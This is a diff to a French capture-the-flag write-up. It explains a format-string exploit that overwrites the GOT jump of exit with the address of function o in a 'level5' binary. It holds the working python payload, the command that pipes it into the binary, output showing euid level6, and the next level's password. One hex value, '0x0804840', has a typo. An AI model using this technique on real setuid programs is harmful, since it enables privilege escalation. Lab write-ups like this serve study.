@@ -57,5 +57,27 @@ On recherche ou est stocke la valeur dans fgets
 
 On le voit ici a la 4eme position
 
+>disas exit
+    0x080483d0 <+0>:	jmp    *0x8049838
+    0x080483d6 <+6>:	push   $0x28
+    0x080483db <+11>:	jmp    0x8048370
+
+quand on regarde exit on voit qu'il jump vers une autre fonction.
+
+on veut alors changer la fonction vers laquelle jump le exit par la fonction o.
+la fonction o commence à 0x080484a4, on retire 4 bytes pour l'adresse du jump d'exit on a donc 0x0804840 = 134513824 en décimal.
+
+On doit donc envoyer l'adresse + un padding de 134513824 à la 4ème position de la stack.
+
+%134513824d permet de reserver un espace de x carctères et de completer par des espaces à gauche si le nombre est plus petit que x
+
+%4$n envoie la len de ce qu'il y a avant à la 4eme position de la stack
+
 > python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'  > /tmp/exploit
+
 > cat /tmp/exploit - | ./level5
+[...]
+> id
+uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
+> cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
